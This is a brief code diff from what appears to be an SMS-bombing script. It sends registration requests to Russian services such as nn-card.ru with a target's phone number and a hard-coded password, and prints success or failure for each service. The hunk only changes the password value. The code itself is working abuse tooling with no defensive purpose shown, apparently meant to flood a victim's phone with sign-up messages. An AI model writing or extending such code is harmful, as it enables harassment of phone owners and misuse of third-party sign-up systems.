@@ -81,7 +81,7 @@ if t == 2:
                     print(colored('ok.ru-[-]', 'blue'))
                 try:
                     a = requests.post("https://nn-card.ru/api/1.0/register",
-                                      json={"phone": phone, "password": '57873456'}, headers=headers)
+                                      json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
                     print(colored('nn-card-[+]', 'cyan'))
                 except:
                     print(colored('nn-card-[-]', 'cyan'))
